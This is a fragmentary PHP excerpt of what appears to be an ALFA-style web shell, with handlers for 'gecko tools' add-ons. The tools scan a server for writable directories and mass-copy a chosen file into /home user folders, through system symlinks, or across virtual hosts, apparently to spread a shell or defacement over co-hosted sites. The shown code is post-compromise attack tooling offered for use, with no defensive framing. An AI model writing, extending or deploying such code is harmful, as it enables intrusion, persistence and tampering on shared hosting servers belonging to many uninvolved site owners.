...
// Gecko tools (recover / find writable / bypass preload / mass copy) — from manager.php
$__gecko_tools = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'gecko_tools.php';
if (@is_file($__gecko_tools)) {
    @include_once $__gecko_tools;
}
...
if (isset($_POST['alfa5']) && $_POST['alfa5'] === '>>') {
    if (!function_exists('geckoRecoverTarget')) {
        echo __pre().'<b>gecko_tools.php missing — upload next to header.php</b>';
    } else {
...
function alfageckoFindWritable(){
alfahead();
AlfaNum(5,6,7,8,9,10);
echo "<div class=header><center><p><div class='txtfont_header'>| Find Writable Dirs |</div></p>";
echo "<form onSubmit=\"g('geckoFindWritable',null,this.path.value,this.depth.value,this.limit.value,'>>');return false;\" method='post'>";
echo '<div class="txtfont">Path: <input size="50" type="text" name="path" value="'.htmlspecialchars($GLOBALS['cwd']).'"> ';
echo 'Depth: <input size="3" type="text" name="depth" value="8"> ';
echo 'Limit: <input size="4" type="text" name="limit" value="200"> ';
echo '<input type="submit" value=" Scan "></div></form></center>';
if (isset($_POST['alfa4']) && $_POST['alfa4'] === '>>') {
    if (!function_exists('geckoFindWritableDirs')) {
        echo __pre().'<b>gecko_tools.php missing</b>';
    } else {
        $path = trim((string)$_POST['alfa1']);
        if ($path === '') $path = $GLOBALS['cwd'];
        $depth = (int)$_POST['alfa2'];
        $limit = (int)$_POST['alfa3'];
        $r = geckoFindWritableDirs($path, $depth, $limit);
        echo __pre();
        if (empty($r['ok'])) {
            echo htmlspecialchars(isset($r['error']) ? $r['error'] : 'fail');
        } else {
            echo 'Found: '.(isset($r['count']) ? (int)$r['count'] : 0)."\n";
            if (!empty($r['dirs']) && is_array($r['dirs'])) {
                foreach ($r['dirs'] as $d) echo htmlspecialchars((string)$d)."\n";
            }
        }
    }
}
...
echo "<form onSubmit=\"g('geckoMassCopy',null,this.src.value,this.base.value,this.mode.value,this.limit.value,'>>');return false;\" method='post'>";
echo '<div class="txtfont">SRC file: <input size="55" type="text" name="src" value="'.htmlspecialchars($GLOBALS['cwd']).'"><br>';
echo 'Base (v1 only): <input size="55" type="text" name="base" value="/home"><br>';
echo 'Mode: <select name="mode"><option value="v1">v1 folder</option><option value="v2">v2 system/symlink</option><option value="v3">v3 vhost</option></select> ';
echo 'Limit: <input size="3" type="text" name="limit" value="25"> ';
...
if (isset($_POST['alfa5']) && $_POST['alfa5'] === '>>') {
    if (!function_exists('geckoMassCopyRun')) {
        ...
        $limit = (int)$_POST['alfa4'];
        if ($limit <= 0) $limit = 25;
        $v2 = ($mode === 'v2');
        $v3 = ($mode === 'v3');
        if ($mode === 'v2') $base = '@system';
        if ($mode === 'v3') $base = '@vhost';
        $r = geckoMassCopyRun($src, $base, true, $v2, $limit, 0, $v3, $mode);
        echo __pre();
        echo htmlspecialchars(isset($r['message']) ? $r['message'] : (empty($r['ok'])?'FAIL':'OK'))."\n";
        if (!empty($r['error'])) echo 'error: '.htmlspecialchars($r['error'])."\n";
